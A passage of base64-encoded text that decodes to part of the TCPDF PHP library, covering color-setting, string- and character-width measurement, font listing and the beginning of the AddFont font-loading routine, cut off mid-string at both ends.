FRU4gY29sb3IgZm9yIFJHQiAoMC0yNTUpLCBvciBNQUdFTlRBIGNvbG9yIGZvciBDTVlLICgwLTEwMCkuCgkgKiBAcGFyYW0gZmxvYXQgJGNvbDMgQkxVRSBjb2xvciBmb3IgUkdCICgwLTI1NSksIG9yIFlFTExPVyBjb2xvciBmb3IgQ01ZSyAoMC0xMDApLgoJICogQHBhcmFtIGZsb2F0ICRjb2w0IEtFWSAoQkxBQ0spIGNvbG9yIGZvciBDTVlLICgwLTEwMCkuCgkgKiBAcGFyYW0gYm9vbGVhbiAkcmV0IElmIHRydWUgZG8gbm90IHNlbmQgdGhlIGNvbW1hbmQuCgkgKiBAcGFyYW0gc3RyaW5nICRuYW1lIFNwb3QgY29sb3IgbmFtZSAoaWYgYW55KS4KCSAqIEByZXR1cm4gc3RyaW5nIFRoZSBQREYgY29tbWFuZC4KCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSAxLjMKCSAqIEBzZWUgU2V0RmlsbENvbG9yQXJyYXkoKSwgU2V0RHJhd0NvbG9yKCksIFNldFRleHRDb2xvcigpLCBSZWN0KCksIENlbGwoKSwgTXVsdGlDZWxsKCkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIHNldEZpbGxDb2xvcigkY29sMT0wLCAkY29sMj0tMSwgJGNvbDM9LTEsICRjb2w0PS0xLCAkcmV0PWZhbHNlLCAkbmFtZT0nJykgewoJCXJldHVybiAkdGhpcy0+c2V0Q29sb3IoJ2ZpbGwnLCAkY29sMSwgJGNvbDIsICRjb2wzLCAkY29sNCwgJHJldCwgJG5hbWUpOwoJfQoKCS8qKgoJICogRGVmaW5lcyB0aGUgY29sb3IgdXNlZCBmb3IgdGV4dC4gSXQgY2FuIGJlIGV4cHJlc3NlZCBpbiBSR0IgY29tcG9uZW50cyBvciBncmF5IHNjYWxlLiBUaGUgbWV0aG9kIGNhbiBiZSBjYWxsZWQgYmVmb3JlIHRoZSBmaXJzdCBwYWdlIGlzIGNyZWF0ZWQgYW5kIHRoZSB2YWx1ZSBpcyByZXRhaW5lZCBmcm9tIHBhZ2UgdG8gcGFnZS4KCSAqIEBwYXJhbSBmbG9hdCAkY29sMSBHUkFZIGxldmVsIGZvciBzaW5nbGUgY29sb3IsIG9yIFJlZCBjb2xvciBmb3IgUkdCICgwLTI1NSksIG9yIENZQU4gY29sb3IgZm9yIENNWUsgKDAtMTAwKS4KCSAqIEBwYXJhbSBmbG9hdCAkY29sMiBHUkVFTiBjb2xvciBmb3IgUkdCICgwLTI1NSksIG9yIE1BR0VOVEEgY29sb3IgZm9yIENNWUsgKDAtMTAwKS4KCSAqIEBwYXJhbSBmbG9hdCAkY29sMyBCTFVFIGNvbG9yIGZvciBSR0IgKDAtMjU1KSwgb3IgWUVMTE9XIGNvbG9yIGZvciBDTVlLICgwLTEwMCkuCgkgKiBAcGFyYW0gZmxvYXQgJGNvbDQgS0VZIChCTEFDSykgY29sb3IgZm9yIENNWUsgKDAtMTAwKS4KCSAqIEBwYXJhbSBib29sZWFuICRyZXQgSWYgdHJ1ZSBkbyBub3Qgc2VuZCB0aGUgY29tbWFuZC4KCSAqIEBwYXJhbSBzdHJpbmcgJG5hbWUgU3BvdCBjb2xvciBuYW1lIChpZiBhbnkpLgoJICogQHJldHVybiBzdHJpbmcgRW1wdHkgc3RyaW5nLgoJICogQHB1YmxpYwoJICogQHNpbmNlIDEuMwoJICogQHNlZSBTZXRUZXh0Q29sb3JBcnJheSgpLCBTZXREcmF3Q29sb3IoKSwgU2V0RmlsbENvbG9yKCksIFRleHQoKSwgQ2VsbCgpLCBNdWx0aUNlbGwoKQoJICovCglwdWJsaWMgZnVuY3Rpb24gc2V0VGV4dENvbG9yKCRjb2wxPTAsICRjb2wyPS0xLCAkY29sMz0tMSwgJGNvbDQ9LTEsICRyZXQ9ZmFsc2UsICRuYW1lPScnKSB7CgkJcmV0dXJuICR0aGlzLT5zZXRDb2xvcigndGV4dCcsICRjb2wxLCAkY29sMiwgJGNvbDMsICRjb2w0LCAkcmV0LCAkbmFtZSk7Cgl9CgoJLyoqCgkgKiBSZXR1cm5zIHRoZSBsZW5ndGggb2YgYSBzdHJpbmcgaW4gdXNlciB1bml0LiBBIGZvbnQgbXVzdCBiZSBzZWxlY3RlZC48YnI+CgkgKiBAcGFyYW0gc3RyaW5nICRzIFRoZSBzdHJpbmcgd2hvc2UgbGVuZ3RoIGlzIHRvIGJlIGNvbXB1dGVkCgkgKiBAcGFyYW0gc3RyaW5nICRmb250bmFtZSBGYW1pbHkgZm9udC4gSXQgY2FuIGJlIGVpdGhlciBhIG5hbWUgZGVmaW5lZCBieSBBZGRGb250KCkgb3Igb25lIG9mIHRoZSBzdGFuZGFyZCBmYW1pbGllcy4gSXQgaXMgYWxzbyBwb3NzaWJsZSB0byBwYXNzIGFuIGVtcHR5IHN0cmluZywgaW4gdGhhdCBjYXNlLCB0aGUgY3VycmVudCBmYW1pbHkgaXMgcmV0YWluZWQuCgkgKiBAcGFyYW0gc3RyaW5nICRmb250c3R5bGUgRm9udCBzdHlsZS4gUG9zc2libGUgdmFsdWVzIGFyZSAoY2FzZSBpbnNlbnNpdGl2ZSk6PHVsPjxsaT5lbXB0eSBzdHJpbmc6IHJlZ3VsYXI8L2xpPjxsaT5COiBib2xkPC9saT48bGk+STogaXRhbGljPC9saT48bGk+VTogdW5kZXJsaW5lPC9saT48bGk+RDogbGluZS10aHJvdWdoPC9saT48bGk+Tzogb3ZlcmxpbmU8L2xpPjwvdWw+IG9yIGFueSBjb21iaW5hdGlvbi4gVGhlIGRlZmF1bHQgdmFsdWUgaXMgcmVndWxhci4KCSAqIEBwYXJhbSBmbG9hdCAkZm9udHNpemUgRm9udCBzaXplIGluIHBvaW50cy4gVGhlIGRlZmF1bHQgdmFsdWUgaXMgdGhlIGN1cnJlbnQgc2l6ZS4KCSAqIEBwYXJhbSBib29sZWFuICRnZXRhcnJheSBpZiB0cnVlIHJldHVybnMgYW4gYXJyYXkgb2YgY2hhcmFjdGVycyB3aWR0aHMsIGlmIGZhbHNlIHJldHVybnMgdGhlIHRvdGFsIGxlbmd0aC4KCSAqIEByZXR1cm4gZmxvYXRbXXxmbG9hdCB0b3RhbCBzdHJpbmcgbGVuZ3RoIG9yIGFycmF5IG9mIGNoYXJhY3RlZCB3aWR0aHMKCSAqIEBwaHBzdGFuLXJldHVybiAoJGdldGFycmF5IGlzIHRydWUgPyBmbG9hdFtdIDogZmxvYXQpIHRvdGFsIHN0cmluZyBsZW5ndGggb3IgYXJyYXkgb2YgY2hhcmFjdGVkIHdpZHRocwoJICogQGF1dGhvciBOaWNvbGEgQXN1bmkKCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSAxLjIKCSAqLwoJcHVibGljIGZ1bmN0aW9uIEdldFN0cmluZ1dpZHRoKCRzLCAkZm9udG5hbWU9JycsICRmb250c3R5bGU9JycsICRmb250c2l6ZT0wLCAkZ2V0YXJyYXk9ZmFsc2UpIHsKCQlyZXR1cm4gJHRoaXMtPkdldEFyclN0cmluZ1dpZHRoKFRDUERGX0ZPTlRTOjp1dGY4QmlkaShUQ1BERl9GT05UUzo6VVRGOFN0cmluZ1RvQXJyYXkoJHMsICR0aGlzLT5pc3VuaWNvZGUsICR0aGlzLT5DdXJyZW50Rm9udCksICRzLCAkdGhpcy0+dG1wcnRsLCAkdGhpcy0+aXN1bmljb2RlLCAkdGhpcy0+Q3VycmVudEZvbnQpLCAkZm9udG5hbWUsICRmb250c3R5bGUsICRmb250c2l6ZSwgJGdldGFycmF5KTsKCX0KCgkvKioKCSAqIFJldHVybnMgdGhlIHN0cmluZyBsZW5ndGggb2YgYW4gYXJyYXkgb2YgY2hhcnMgaW4gdXNlciB1bml0IG9yIGFuIGFycmF5IG9mIGNoYXJhY3RlcnMgd2lkdGhzLiBBIGZvbnQgbXVzdCBiZSBzZWxlY3RlZC48YnI+CgkgKiBAcGFyYW0gYXJyYXkgJHNhIFRoZSBhcnJheSBvZiBjaGFycyB3aG9zZSB0b3RhbCBsZW5ndGggaXMgdG8gYmUgY29tcHV0ZWQKCSAqIEBwYXJhbSBzdHJpbmcgJGZvbnRuYW1lIEZhbWlseSBmb250LiBJdCBjYW4gYmUgZWl0aGVyIGEgbmFtZSBkZWZpbmVkIGJ5IEFkZEZvbnQoKSBvciBvbmUgb2YgdGhlIHN0YW5kYXJkIGZhbWlsaWVzLiBJdCBpcyBhbHNvIHBvc3NpYmxlIHRvIHBhc3MgYW4gZW1wdHkgc3RyaW5nLCBpbiB0aGF0IGNhc2UsIHRoZSBjdXJyZW50IGZhbWlseSBpcyByZXRhaW5lZC4KCSAqIEBwYXJhbSBzdHJpbmcgJGZvbnRzdHlsZSBGb250IHN0eWxlLiBQb3NzaWJsZSB2YWx1ZXMgYXJlIChjYXNlIGluc2Vuc2l0aXZlKTo8dWw+PGxpPmVtcHR5IHN0cmluZzogcmVndWxhcjwvbGk+PGxpPkI6IGJvbGQ8L2xpPjxsaT5JOiBpdGFsaWM8L2xpPjxsaT5VOiB1bmRlcmxpbmU8L2xpPjxsaT5EOiBsaW5lIHRocm91Z2g8L2xpPjxsaT5POiBvdmVybGluZTwvbGk+PC91bD4gb3IgYW55IGNvbWJpbmF0aW9uLiBUaGUgZGVmYXVsdCB2YWx1ZSBpcyByZWd1bGFyLgoJICogQHBhcmFtIGZsb2F0ICRmb250c2l6ZSBGb250IHNpemUgaW4gcG9pbnRzLiBUaGUgZGVmYXVsdCB2YWx1ZSBpcyB0aGUgY3VycmVudCBzaXplLgoJICogQHBhcmFtIGJvb2xlYW4gJGdldGFycmF5IGlmIHRydWUgcmV0dXJucyBhbiBhcnJheSBvZiBjaGFyYWN0ZXJzIHdpZHRocywgaWYgZmFsc2UgcmV0dXJucyB0aGUgdG90YWwgbGVuZ3RoLgoJICogQHJldHVybiBmbG9hdFtdfGZsb2F0IHRvdGFsIHN0cmluZyBsZW5ndGggb3IgYXJyYXkgb2YgY2hhcmFjdGVkIHdpZHRocwoJICogQHBocHN0YW4tcmV0dXJuICgkZ2V0YXJyYXkgaXMgdHJ1ZSA/IGZsb2F0W10gOiBmbG9hdCkgdG90YWwgc3RyaW5nIGxlbmd0aCBvciBhcnJheSBvZiBjaGFyYWN0ZWQgd2lkdGhzCgkgKiBAYXV0aG9yIE5pY29sYSBBc3VuaQoJICogQHB1YmxpYwoJICogQHNpbmNlIDIuNC4wMDAgKDIwMDgtMDMtMDYpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBHZXRBcnJTdHJpbmdXaWR0aCgkc2EsICRmb250bmFtZT0nJywgJGZvbnRzdHlsZT0nJywgJGZvbnRzaXplPTAsICRnZXRhcnJheT1mYWxzZSkgewoJCS8vIHN0b3JlIGN1cnJlbnQgdmFsdWVzCgkJaWYgKCFUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkZm9udG5hbWUpKSB7CgkJCSRwcmV2X0ZvbnRGYW1pbHkgPSAkdGhpcy0+Rm9udEZhbWlseTsKCQkJJHByZXZfRm9udFN0eWxlID0gJHRoaXMtPkZvbnRTdHlsZTsKCQkJJHByZXZfRm9udFNpemVQdCA9ICR0aGlzLT5Gb250U2l6ZVB0OwoJCQkkdGhpcy0+c2V0Rm9udCgkZm9udG5hbWUsICRmb250c3R5bGUsICRmb250c2l6ZSwgJycsICdkZWZhdWx0JywgZmFsc2UpOwoJCX0KCQkvLyBjb252ZXJ0IFVURi04IGFycmF5IHRvIExhdGluMSBpZiByZXF1aXJlZAoJCWlmICgkdGhpcy0+aXN1bmljb2RlIEFORCAoISR0aGlzLT5pc1VuaWNvZGVGb250KCkpKSB7CgkJCSRzYSA9IFRDUERGX0ZPTlRTOjpVVEY4QXJyVG9MYXRpbjFBcnIoJHNhKTsKCQl9CgkJJHcgPSAwOyAvLyB0b3RhbCB3aWR0aAoJCSR3YSA9IGFycmF5KCk7IC8vIGFycmF5IG9mIGNoYXJhY3RlcnMgd2lkdGhzCgkJZm9yZWFjaCAoJHNhIGFzICRjayA9PiAkY2hhcikgewoJCQkvLyBjaGFyYWN0ZXIgd2lkdGgKCQkJJGN3ID0gJHRoaXMtPkdldENoYXJXaWR0aCgkY2hhciwgaXNzZXQoJHNhWygkY2sgKyAxKV0pKTsKCQkJJHdhW10gPSAkY3c7CgkJCSR3ICs9ICRjdzsKCQl9CgkJLy8gcmVzdG9yZSBwcmV2aW91cyB2YWx1ZXMKCQlpZiAoIVRDUERGX1NUQVRJQzo6ZW1wdHlfc3RyaW5nKCRmb250bmFtZSkpIHsKCQkJJHRoaXMtPnNldEZvbnQoJHByZXZfRm9udEZhbWlseSwgJHByZXZfRm9udFN0eWxlLCAkcHJldl9Gb250U2l6ZVB0LCAnJywgJ2RlZmF1bHQnLCBmYWxzZSk7CgkJfQoJCWlmICgkZ2V0YXJyYXkpIHsKCQkJcmV0dXJuICR3YTsKCQl9CgkJcmV0dXJuICR3OwoJfQoKCS8qKgoJICogUmV0dXJucyB0aGUgbGVuZ3RoIG9mIHRoZSBjaGFyIGluIHVzZXIgdW5pdCBmb3IgdGhlIGN1cnJlbnQgZm9udCBjb25zaWRlcmluZyBjdXJyZW50IHN0cmV0Y2hpbmcgYW5kIHNwYWNpbmcgKHRyYWNraW5nKS4KCSAqIEBwYXJhbSBpbnQgJGNoYXIgVGhlIGNoYXIgY29kZSB3aG9zZSBsZW5ndGggaXMgdG8gYmUgcmV0dXJuZWQKCSAqIEBwYXJhbSBib29sZWFuICRub3RsYXN0IElmIGZhbHNlIGlnbm9yZSB0aGUgZm9udC1zcGFjaW5nLgoJICogQHJldHVybiBmbG9hdCBjaGFyIHdpZHRoCgkgKiBAYXV0aG9yIE5pY29sYSBBc3VuaQoJICogQHB1YmxpYwoJICogQHNpbmNlIDIuNC4wMDAgKDIwMDgtMDMtMDYpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBHZXRDaGFyV2lkdGgoJGNoYXIsICRub3RsYXN0PXRydWUpIHsKCQkvLyBnZXQgcmF3IHdpZHRoCgkJJGNodyA9ICR0aGlzLT5nZXRSYXdDaGFyV2lkdGgoJGNoYXIpOwoJCWlmICgoJHRoaXMtPmZvbnRfc3BhY2luZyA8IDApIE9SICgoJHRoaXMtPmZvbnRfc3BhY2luZyA+IDApIEFORCAkbm90bGFzdCkpIHsKCQkJLy8gaW5jcmVhc2UvZGVjcmVhc2UgZm9udCBzcGFjaW5nCgkJCSRjaHcgKz0gJHRoaXMtPmZvbnRfc3BhY2luZzsKCQl9CgkJaWYgKCR0aGlzLT5mb250X3N0cmV0Y2hpbmcgIT0gMTAwKSB7CgkJCS8vIGZpeGVkIHN0cmV0Y2hpbmcgbW9kZQoJCQkkY2h3ICo9ICgkdGhpcy0+Zm9udF9zdHJldGNoaW5nIC8gMTAwKTsKCQl9CgkJcmV0dXJuICRjaHc7Cgl9CgoJLyoqCgkgKiBSZXR1cm5zIHRoZSBsZW5ndGggb2YgdGhlIGNoYXIgaW4gdXNlciB1bml0IGZvciB0aGUgY3VycmVudCBmb250LgoJICogQHBhcmFtIGludCAkY2hhciBUaGUgY2hhciBjb2RlIHdob3NlIGxlbmd0aCBpcyB0byBiZSByZXR1cm5lZAoJICogQHJldHVybiBmbG9hdCBjaGFyIHdpZHRoCgkgKiBAYXV0aG9yIE5pY29sYSBBc3VuaQoJICogQHB1YmxpYwoJICogQHNpbmNlIDUuOS4wMDAgKDIwMTAtMDktMjgpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBnZXRSYXdDaGFyV2lkdGgoJGNoYXIpIHsKCQlpZiAoJGNoYXIgPT0gMTczKSB7CgkJCS8vIFNIWSBjaGFyYWN0ZXIgd2lsbCBub3QgYmUgcHJpbnRlZAoJCQlyZXR1cm4gKDApOwoJCX0KCQlpZiAoaXNzZXQoJHRoaXMtPkN1cnJlbnRGb250WydjdyddW2ludHZhbCgkY2hhcildKSkgewoJCQkkdyA9ICR0aGlzLT5DdXJyZW50Rm9udFsnY3cnXVtpbnR2YWwoJGNoYXIpXTsKCQl9IGVsc2VpZiAoaXNzZXQoJHRoaXMtPkN1cnJlbnRGb250WydkdyddKSkgewoJCQkvLyBkZWZhdWx0IHdpZHRoCgkJCSR3ID0gJHRoaXMtPkN1cnJlbnRGb250WydkdyddOwoJCX0gZWxzZWlmIChpc3NldCgkdGhpcy0+Q3VycmVudEZvbnRbJ2N3J11bMzJdKSkgewoJCQkvLyBkZWZhdWx0IHdpZHRoCgkJCSR3ID0gJHRoaXMtPkN1cnJlbnRGb250WydjdyddWzMyXTsKCQl9IGVsc2UgewoJCQkkdyA9IDYwMDsKCQl9CgkJcmV0dXJuICR0aGlzLT5nZXRBYnNGb250TWVhc3VyZSgkdyk7Cgl9CgoJLyoqCgkgKiBSZXR1cm5zIHRoZSBudW1iZXJvIG9mIGNoYXJhY3RlcnMgaW4gYSBzdHJpbmcuCgkgKiBAcGFyYW0gc3RyaW5nICRzIFRoZSBpbnB1dCBzdHJpbmcuCgkgKiBAcmV0dXJuIGludCBudW1iZXIgb2YgY2hhcmFjdGVycwoJICogQHB1YmxpYwoJICogQHNpbmNlIDIuMC4wMDAxICgyMDA4LTAxLTA3KQoJICovCglwdWJsaWMgZnVuY3Rpb24gR2V0TnVtQ2hhcnMoJHMpIHsKCQlpZiAoJHRoaXMtPmlzVW5pY29kZUZvbnQoKSkgewoJCQlyZXR1cm4gY291bnQoVENQREZfRk9OVFM6OlVURjhTdHJpbmdUb0FycmF5KCRzLCAkdGhpcy0+aXN1bmljb2RlLCAkdGhpcy0+Q3VycmVudEZvbnQpKTsKCQl9CgkJcmV0dXJuIHN0cmxlbigkcyk7Cgl9CgoJLyoqCgkgKiBGaWxsIHRoZSBsaXN0IG9mIGF2YWlsYWJsZSBmb250cyAoJHRoaXMtPmZvbnRsaXN0KS4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA0LjAuMDEzICgyMDA4LTA3LTI4KQoJICovCglwcm90ZWN0ZWQgZnVuY3Rpb24gZ2V0Rm9udHNMaXN0KCkgewoJCWlmICgoJGZvbnRzZGlyID0gb3BlbmRpcihUQ1BERl9GT05UUzo6X2dldGZvbnRwYXRoKCkpKSAhPT0gZmFsc2UpIHsKCQkJd2hpbGUgKCgkZmlsZSA9IHJlYWRkaXIoJGZvbnRzZGlyKSkgIT09IGZhbHNlKSB7CgkJCQlpZiAoc3Vic3RyKCRmaWxlLCAtNCkgPT0gJy5waHAnKSB7CgkJCQkJYXJyYXlfcHVzaCgkdGhpcy0+Zm9udGxpc3QsIHN0cnRvbG93ZXIoYmFzZW5hbWUoJGZpbGUsICcucGhwJykpKTsKCQkJCX0KCQkJfQoJCQljbG9zZWRpcigkZm9udHNkaXIpOwoJCX0KCX0KCgkvKioKCSAqIEltcG9ydHMgYSBUcnVlVHlwZSwgVHlwZTEsIGNvcmUsIG9yIENJRDAgZm9udCBhbmQgbWFrZXMgaXQgYXZhaWxhYmxlLgoJICogSXQgaXMgbmVjZXNzYXJ5IHRvIGdlbmVyYXRlIGEgZm9udCBkZWZpbml0aW9uIGZpbGUgZmlyc3QgKHJlYWQgL2ZvbnRzL3V0aWxzL1JFQURNRS5UWFQpLgoJICogVGhlIGRlZmluaXRpb24gZmlsZSAoYW5kIHRoZSBmb250IGZpbGUgaXRzZWxmIHdoZW4gZW1iZWRkaW5nKSBtdXN0IGJlIHByZXNlbnQgZWl0aGVyIGluIHRoZSBjdXJyZW50IGRpcmVjdG9yeSBvciBpbiB0aGUgb25lIGluZGljYXRlZCBieSBLX1BBVEhfRk9OVFMgaWYgdGhlIGNvbnN0YW50IGlzIGRlZmluZWQuIElmIGl0IGNvdWxkIG5vdCBiZSBmb3VuZCwgdGhlIGVycm9yICJDb3VsZCBub3QgaW5jbHVkZSBmb250IGRlZmluaXRpb24gZmlsZSIgaXMgZ2VuZXJhdGVkLgoJICogQHBhcmFtIHN0cmluZyAkZmFtaWx5IEZvbnQgZmFtaWx5LiBUaGUgbmFtZSBjYW4gYmUgY2hvc2VuIGFyYml0cmFyaWx5LiBJZiBpdCBpcyBhIHN0YW5kYXJkIGZhbWlseSBuYW1lLCBpdCB3aWxsIG92ZXJyaWRlIHRoZSBjb3JyZXNwb25kaW5nIGZvbnQuCgkgKiBAcGFyYW0gc3RyaW5nICRzdHlsZSBGb250IHN0eWxlLiBQb3NzaWJsZSB2YWx1ZXMgYXJlIChjYXNlIGluc2Vuc2l0aXZlKTo8dWw+PGxpPmVtcHR5IHN0cmluZzogcmVndWxhciAoZGVmYXVsdCk8L2xpPjxsaT5COiBib2xkPC9saT48bGk+STogaXRhbGljPC9saT48bGk+Qkkgb3IgSUI6IGJvbGQgaXRhbGljPC9saT48L3VsPgoJICogQHBhcmFtIHN0cmluZyAkZm9udGZpbGUgVGhlIGZvbnQgZGVmaW5pdGlvbiBmaWxlLiBCeSBkZWZhdWx0LCB0aGUgbmFtZSBpcyBidWlsdCBmcm9tIHRoZSBmYW1pbHkgYW5kIHN0eWxlLCBpbiBsb3dlciBjYXNlIHdpdGggbm8gc3BhY2VzLgoJICogQHJldHVybiBhcnJheXxmYWxzZSBhcnJheSBjb250YWluaW5nIHRoZSBmb250IGRhdGEsIG9yIGZhbHNlIGluIGNhc2Ugb2YgZXJyb3IuCgkgKiBAcGFyYW0gbWl4ZWQgJHN1YnNldCBpZiB0cnVlIGVtYmVkZCBvbmx5IGEgc3Vic2V0IG9mIHRoZSBmb250IChzdG9yZXMgb25seSB0aGUgaW5mb3JtYXRpb24gcmVsYXRlZCB0byB0aGUgdXNlZCBjaGFyYWN0ZXJzKTsgaWYgZmFsc2UgZW1iZWRkIGZ1bGwgZm9udDsgaWYgJ2RlZmF1bHQnIHVzZXMgdGhlIGRlZmF1bHQgdmFsdWUgc2V0IHVzaW5nIHNldEZvbnRTdWJzZXR0aW5nKCkuIFRoaXMgb3B0aW9uIGlzIHZhbGlkIG9ubHkgZm9yIFRydWVUeXBlVW5pY29kZSBmb250cy4gSWYgeW91IHdhbnQgdG8gZW5hYmxlIHVzZXJzIHRvIGNoYW5nZSB0aGUgZG9jdW1lbnQsIHNldCB0aGlzIHBhcmFtZXRlciB0byBmYWxzZS4gSWYgeW91IHN1YnNldCB0aGUgZm9udCwgdGhlIHBlcnNvbiB3aG8gcmVjZWl2ZXMgeW91ciBQREYgd291bGQgbmVlZCB0byBoYXZlIHlvdXIgc2FtZSBmb250IGluIG9yZGVyIHRvIG1ha2UgY2hhbmdlcyB0byB5b3VyIFBERi4gVGhlIGZpbGUgc2l6ZSBvZiB0aGUgUERGIHdvdWxkIGFsc28gYmUgc21hbGxlciBiZWNhdXNlIHlvdSBhcmUgZW1iZWRkaW5nIG9ubHkgcGFydCBvZiBhIGZvbnQuCgkgKiBAcHVibGljCgkgKiBAc2luY2UgMS41CgkgKiBAc2VlIFNldEZvbnQoKSwgc2V0Rm9udFN1YnNldHRpbmcoKQoJICovCglwdWJsaWMgZnVuY3Rpb24gQWRkRm9udCgkZmFtaWx5LCAkc3R5bGU9JycsICRmb250ZmlsZT0nJywgJHN1YnNldD0nZGVmYXVsdCcpIHsKCQlpZiAoJHN1YnNldCA9PT0gJ2RlZmF1bHQnKSB7CgkJCSRzdWJzZXQgPSAkdGhpcy0+Zm9udF9zdWJzZXR0aW5nOwoJCX0KCQlpZiAoJHRoaXMtPnBkZmFfbW9kZSkgewoJCQkkc3Vic2V0ID0gZmFsc2U7CgkJfQoJCWlmIChUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkZmFtaWx5KSkgewoJCQlpZiAoIVRDUERGX1NUQVRJQzo6ZW1wdHlfc3RyaW5nKCR0aGlzLT5Gb250RmFtaWx5KSkgewoJCQkJJGZhbWlseSA9ICR0aGlzLT5Gb250RmFtaWx5OwoJCQl9IGVsc2UgewoJCQkJJHRoaXMtPkVycm9yKCdFbXB0eSBmb250IGZhbWlseScpOwoJCQl9CgkJfQoJCS8vIG1vdmUgZW1iZWRkZWQgc3R5bGVzIG9uICRzdHlsZQoJCWlmIChzdWJzdHIoJGZhbWlseSwgLTEpID09ICdJJykgewoJCQkkc3R5bGUgLj0gJ0knOwoJCQkkZmFtaWx5ID0gc3Vic3RyKCRmYW1pbHksIDAsIC0xKTsKCQl9CgkJaWYgKHN1YnN0cigkZmFtaWx5LCAtMSkgPT0gJ0InKSB7CgkJCSRzdHlsZSAuPSAnQic7CgkJCSRmYW1pbHkgPSBzdWJzdHIoJGZhbWlseSwgMCwgLTEpOwoJCX0KCQkvLyBub3JtYWxpemUgZmFtaWx5IG5hbWUKCQkkZmFtaWx5ID0gc3RydG9sb3dlcigkZmFtaWx5KTsKCQlpZiAoKCEkdGhpcy0+aXN1bmljb2RlKSBBTkQgKCRmYW1pbHkgPT0gJ2FyaWFsJykpIHsKCQkJJGZhbWlseSA9ICdoZWx2ZXRpY2EnOwoJCX0KCQlpZiAoKCRmYW1pbHkgPT0gJ3N5bWJvbCcpIE9SICgkZmFtaWx5ID09ICd6YXBmZGluZ2JhdHMnKSkgewoJCQkkc3R5bGUgPSAnJzsKCQl9CgkJaWYgKCR0aGlzLT5wZGZhX21vZGUgQU5EIChpc3NldCgkdGhpcy0+Q29yZUZvbnRzWyRmYW1pbHldKSkpIHsKCQkJLy8gYWxsIGZvbnRzIG11c3QgYmUgZW1iZWRkZWQKCQkJJGZhbWlseSA9ICdwZGZhJy4kZmFtaWx5OwoJCX0KCQkkdGVtcHN0eWxlID0gc3RydG91cHBlcigkc3R5bGUgPT09IG51bGwgPyAnJyA6ICRzdHlsZSk7CgkJJHN0eWxlID0gJyc7CgkJLy8gdW5kZXJsaW5lCgkJaWYgKHN0cnBvcygkdGVtcHN0eWxlLCAnVScpICE9PSBmYWxzZSkgewoJCQkkdGhpcy0+dW5kZXJsaW5lID0gdHJ1ZTsKCQl9IGVsc2UgewoJCQkkdGhpcy0+dW5kZXJsaW5lID0gZmFsc2U7CgkJfQoJCS8vIGxpbmUtdGhyb3VnaCAoZGVsZXRlZCkKCQlpZiAoc3RycG9zKCR0ZW1wc3R5bGUsICdEJykgIT09IGZhbHNlKSB7CgkJCSR0aGlzLT5saW5ldGhyb3VnaCA9IHRydWU7CgkJfSBlbHNlIHsKCQkJJHRoaXMtPmxpbmV0aHJvdWdoID0gZmFsc2U7CgkJfQoJCS8vIG92ZXJsaW5lCgkJaWYgKHN0cnBvcygkdGVtcHN0eWxlLCAnTycpICE9PSBmYWxzZSkgewoJCQkkdGhpcy0+b3ZlcmxpbmUgPSB0cnVlOwoJCX0gZWxzZSB7CgkJCSR0aGlzLT5vdmVybGluZSA9IGZhbHNlOwoJCX0KCQkvLyBib2xkCgkJaWYgKHN0cnBvcygkdGVtcHN0eWxlLCAnQicpICE9PSBmYWxzZSkgewoJCQkkc3R5bGUgLj0gJ0InOwoJCX0KCQkvLyBvYmxpcXVlCgkJaWYgKHN0cnBvcygkdGVtcHN0eWxlLCAnSScpICE9PSBmYWxzZSkgewoJCQkkc3R5bGUgLj0gJ0knOwoJCX0KCQkkYmlzdHlsZSA9ICRzdHlsZTsKCQkkZm9udGtleSA9ICRmYW1pbHkuJHN0eWxlOwoJCSRmb250X3N0eWxlID0gJHN0eWxlLigkdGhpcy0+dW5kZXJsaW5lID8gJ1UnIDogJycpLigkdGhpcy0+bGluZXRocm91Z2ggPyAnRCcgOiAnJykuKCR0aGlzLT5vdmVybGluZSA/ICdPJyA6ICcnKTsKCQkkZm9udGRhdGEgPSBhcnJheSgnZm9udGtleScgPT4gJGZvbnRrZXksICdmYW1pbHknID0+ICRmYW1pbHksICdzdHlsZScgPT4gJGZvbnRfc3R5bGUpOwoJCS8vIGNoZWNrIGlmIHRoZSBmb250IGhhcyBiZWVuIGFscmVhZHkgYWRkZWQKCQkkZmIgPSAkdGhpcy0+Z2V0Rm9udEJ1ZmZlcigkZm9udGtleSk7CgkJaWYgKCRmYiAhPT0gZmFsc2UpIHsKCQkJaWYgKCR0aGlzLT5pbnhvYmopIHsKCQkJCS8vIHdlIGFyZSBpbnNpZGUgYW4gWE9iamVjdCB0ZW1wbGF0ZQoJCQkJJHRoaXMtPnhvYmplY3RzWyR0aGlzLT54b2JqaWRdWydmb250cyddWyRmb250a2V5XSA9ICRmYlsnaSddOwoJCQl9CgkJCXJldHVybiAkZm9udGRhdGE7CgkJfQoJCS8vIGdldCBzcGVjaWZpZWQgZm9udCBkaXJlY3RvcnkgKGlmIGFueSkKCQkkZm9udGRpciA9IGZhbHNlOwoJCWlmICghVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJGZvbnRmaWxlKSkgewoJCQkkZm9udGRpciA9IGRpcm5hbWUoJGZvbnRmaWxlKTsKCQkJaWYgKFRDUERGX1NUQVRJQzo6ZW1wdHlfc3RyaW5nKCRmb250ZGlyKSBPUiAoJGZvbnRkaXIgPT0gJy4nKSkgewoJCQkJJGZvbnRkaXIgPSAnJzsKCQkJfSBlbHNlIHsKCQkJCSRmb250ZGlyIC49ICcvJzsKCQkJfQoJCX0KCQkvLyB0cnVlIHdoZW4gdGhlIGZvbnQgc3R5bGUgdmFyaWF0aW9uIGlzIG1pc3NpbmcKCQkkbWlzc2luZ19zdHlsZSA9IGZhbHNlOwoJCS8vIHNlYXJjaCBhbmQgaW5jbHVkZSBmb250IGZpbGUKCQlpZiAoVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJGZvbnRmaWxlKSBPUiAoIUBUQ1BERl9TVEFUSUM6OmZpbGVfZXhpc3RzKCRmb250ZmlsZSkpKSB7CgkJCS8vIGJ1aWxkIGEgc3RhbmRhcmQgZmlsZW5hbWVzIGZvciBzcGVjaWZpZWQgZm9udAoJCQkkdG1wX2ZvbnRmaWxlID